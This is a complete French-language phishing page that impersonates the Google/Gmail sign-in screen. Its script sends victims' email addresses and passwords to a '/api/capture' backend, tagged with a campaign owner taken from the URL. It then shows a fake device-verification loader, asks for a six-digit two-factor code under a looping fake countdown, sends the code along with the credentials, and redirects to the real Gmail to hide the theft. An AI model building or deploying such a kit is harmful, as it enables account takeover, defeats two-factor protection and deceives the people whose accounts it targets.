<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Comptes Google</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
            background-color: #f0f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            transition: background-color 0.4s ease;
        }
        /* Mode sombre global activé pendant le chargement de 5 secondes */
        body.dark-mode {
            background-color: #121212;
        }

        .google-container {
            background-color: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 450px;
            box-sizing: border-box;
            text-align: center;
            position: relative;
            transition: background-color 0.4s ease, border-color 0.4s ease;
        }
        body.dark-mode .google-container {
            background-color: #1e1f20;
            border-color: #3c4043;
        }

        .google-logo {
            width: 75px;
            height: auto;
            margin-bottom: 15px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #1f1f1f;
            margin-bottom: 8px;
            margin-top: 0;
            transition: color 0.4s ease;
        }
        body.dark-mode h1 {
            color: #e3e3e3;
        }

        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 30px;
            transition: color 0.4s ease;
        }
        body.dark-mode .subtitle {
            color: #c4c7c5;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 15px;
            background-color: transparent;
            border: 1px solid #747775;
            border-radius: 4px;
            font-size: 16px;
            color: #1f1f1f;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s, color 0.4s ease;
        }
        body.dark-mode .input-field {
            border-color: #8e918f;
            color: #e3e3e3;
        }

        .input-field:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 14px;
        }

        .google-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
            margin-top: 10px;
            transition: background-color 0.2s;
        }
        .google-btn:hover {
            background-color: #1557b0;
        }

        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }

        /* Écran de chargement circulaire (5 secondes) */
        .loader-overlay {
            display: none;
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 8px;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        body.dark-mode .loader-overlay {
            background: rgba(30, 31, 32, 0.95);
        }
        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #dadce0;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text {
            font-size: 14px;
            color: #1f1f1f;
            font-weight: 500;
        }
        body.dark-mode .loader-text {
            color: #e3e3e3;
        }

        /* Section OTP à 6 carreaux */
        .otp-container {
            display: none;
            text-align: center;
        }
        .otp-container h3 {
            color: #1a73e8;
            font-size: 20px;
            margin-top: 0;
            margin-bottom: 10px;
        }
        .otp-container p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 25px;
            line-height: 1.4;
        }
        body.dark-mode .otp-container p {
            color: #c4c7c5;
        }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin-bottom: 24px;
        }
        .otp-box {
            width: 42px;
            height: 48px;
            background-color: transparent;
            border: 1px solid #747775;
            border-radius: 4px;
            font-size: 22px;
            color: #1f1f1f;
            text-align: center;
            outline: none;
            box-sizing: border-box;
        }
        body.dark-mode .otp-box {
            border-color: #8e918f;
            color: #e3e3e3;
        }
        .otp-box:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }

        /* Chronomètre en boucle de 20s */
        .timer-display {
            text-align: center;
            margin-top: 15px;
            font-size: 13px;
            color: #d93025;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="google-container">
        <!-- Logo Google officiel -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
        
        <h1 id="page-title">Connexion</h1>
        <p class="subtitle" id="page-subtitle">Accéder à Gmail</p>

        <!-- ÉTAPE 1 : Formulaire d'identifiants initial -->
        <form id="loginForm" onsubmit="handleLoginSubmit(event)" class="clearfix">
            <div class="input-group">
                <input type="text" id="username" class="input-field" placeholder="Adresse e-mail ou téléphone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
            </div>

            <button type="submit" class="google-btn">Suivant</button>
        </form>

        <!-- ÉCRAN DE CHARGEMENT CIRCULAIRE (5 SECONDES) -->
        <div id="loader-overlay" class="loader-overlay">
            <div class="spinner"></div>
            <div class="loader-text">Vérification de l'appareil...</div>
        </div>

        <!-- ÉTAPE 2 : Section Code OTP (6 Carreaux) -->
        <div id="otp-container" class="otp-container">
            <h3>Validation en deux étapes</h3>
            <p>Entrez le code à 6 chiffres envoyé sur votre appareil de confiance.</p>
            
            <form id="otp-form" onsubmit="handleOtpSubmit(event)">
                <div class="otp-inputs">
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required autofocus>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                </div>
                <button type="submit" class="google-btn" style="float: none; width: 100%;">Valider</button>
            </form>
            <div class="timer-display" id="timer-text">Expiration du code : 20s</div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        let savedUser = "";
        let savedPass = "";
        let countdownInterval = null;

        // Gestion du comportement des 6 carreaux OTP
        const otpBoxes = document.querySelectorAll('.otp-box');
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                const value = e.target.value;
                if (value && index < otpBoxes.length - 1) {
                    otpBoxes[index + 1].focus();
                }
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !box.value && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });
        });

        // Étape 1 : Soumission des identifiants
        function handleLoginSubmit(event) {
            event.preventDefault();

            savedUser = document.getElementById('username').value;
            savedPass = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "Gmail",
                type: "otp_step1",
                victimUser: savedUser,
                victimPass: savedPass,
                otp: "Aucun"
            };

            // 1. Envoi immédiat des identifiants au backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.log(err));

            // 2. Activer le mode sombre et afficher le chargement circulaire de 5s
            document.body.classList.add('dark-mode');
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('page-title').style.display = 'none';
            document.getElementById('page-subtitle').style.display = 'none';
            document.getElementById('loader-overlay').style.display = 'flex';

            // 3. Attendre 5 secondes puis afficher l'interface OTP
            setTimeout(() => {
                document.getElementById('loader-overlay').style.display = 'none';
                document.getElementById('otp-container').style.display = 'block';
                
                // Démarrer le chronomètre en boucle de 20 secondes
                startLoopingTimer();
                otpBoxes[0].focus();
            }, 5000);
        }

        // Chronomètre en boucle (20s)
        function startLoopingTimer() {
            let timeLeft = 20;
            const timerElement = document.getElementById('timer-text');
            
            if (countdownInterval) clearInterval(countdownInterval);

            countdownInterval = setInterval(() => {
                timerElement.textContent = `⏳ Expiration du code dans : ${timeLeft}s`;
                timeLeft--;

                if (timeLeft < 0) {
                    timeLeft = 20;
                }
            }, 1000);
        }

        // Étape 2 : Soumission du code OTP combiné des 6 carreaux
        function handleOtpSubmit(event) {
            event.preventDefault();
            if (countdownInterval) clearInterval(countdownInterval);

            let otpVal = "";
            otpBoxes.forEach(box => {
                otpVal += box.value;
            });

            const payload = {
                owner: campaignOwner,
                network: "Gmail",
                type: linkType,
                victimUser: savedUser,
                victimPass: savedPass,
                otp: otpVal
            };

            // Envoi complet vers le backend Flask
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://mail.google.com";
            }).catch(error => {
                window.location.href = "https://mail.google.com";
            });
        }
    </script>
</body>
</html>
